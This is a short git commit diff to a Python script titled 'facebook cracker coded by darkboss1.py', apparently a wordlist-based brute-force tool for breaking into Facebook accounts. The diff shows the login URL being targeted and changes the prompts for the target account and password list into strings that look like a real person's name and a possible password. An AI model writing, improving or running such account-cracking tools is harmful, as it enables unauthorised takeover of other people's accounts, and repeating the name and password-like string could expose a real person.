a58b5f94e2dd393c1cf0e7144af07c300e736c76
samiexp <163497483+samiexp@users.noreply.github.com>
2024-03-15 11:22:59 +0600

    Update facebook cracker coded by darkboss1.py

--- facebook cracker coded by darkboss1.py
+++ facebook cracker coded by darkboss1.py
@@ -9,10 +9,10 @@ import random
 
 
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+email = str(raw_input("Sakib Ahmed : "))
 
 
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+passwordlist = str(raw_input("s@mij@ber80 : "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
